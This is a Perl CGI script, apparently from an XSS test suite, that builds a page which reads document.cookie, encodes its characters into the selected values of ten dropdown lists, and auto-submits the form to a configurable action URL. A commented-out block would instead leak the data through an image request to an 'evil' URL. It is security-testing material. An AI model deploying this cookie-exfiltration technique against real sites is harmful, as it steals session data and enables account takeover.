#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Tests storing data in select-dropdownlists";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq|
<pre>
	<form name="testform2" action="$actionurl">
|;
for ($j = 0; $j < 10; $j++) {
	print qq|
			<select id="testselect_$j" name="testselect_$j" size="1">
	|;
	for ($i = 0; $i < 26; $i++) {
		print qq| <option value="|. chr($i +ord('a')). qq|">|. chr($i +ord('a')). qq|</option>
		|;
	}
	print qq| 
			</select>
	|;
}
print qq|
	</form>
</pre>
    <script type="text/javascript">

		
		var mycookie = $evil;
		document.getElementById("testptag").innerHTML = "mycookie = '" + mycookie + "' ";
		var myform = document.testform2;
		var i;
		for (i = 0; i < 9; i++) {
			var dut = mycookie.toLowerCase().charCodeAt(i) - "a".charCodeAt(0);			
			document.getElementById("testselect_"+i).selectedIndex = dut;
			document.getElementById("testptag").innerHTML = document.getElementById("testptag").innerHTML + " i = " + i + " dut = " + dut;
		}

/*		
		var reportdut = document.getElementById("testptag").innerHTML;
		
		var url = "$imgevilurl?normal=" + reportdut;
		document.images[0].src = url;
*/
		myform.submit();
		
    </script>
|;

require "xss_basic_footer.pl";
